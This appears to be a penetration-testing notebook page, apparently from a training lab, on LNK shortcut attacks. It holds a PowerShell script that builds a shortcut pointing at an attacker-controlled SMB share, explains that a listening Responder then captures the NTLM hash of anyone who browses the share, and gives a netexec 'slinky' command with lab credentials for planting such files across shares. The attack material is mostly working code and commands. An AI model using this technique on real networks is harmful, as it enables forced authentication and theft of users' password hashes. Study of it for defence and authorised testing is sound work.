# 🗄️ LNK File Attacks

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.138.149\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

What will happen if we have responder listening and this file is triggered, we will get a hash and force auth:

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

good example:

{% embed url="https://infinitelogins.com/2020/12/17/capturing-password-hashes-via-malicious-lnk-files/" %}

everyone who will interact with this share will send us a hash, very malicious&#x20;

A good thing to know is :

```
netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149
```

{% embed url="https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky" %}

{% embed url="https://www.netexec.wiki/" %}

{% embed url="https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf" %}
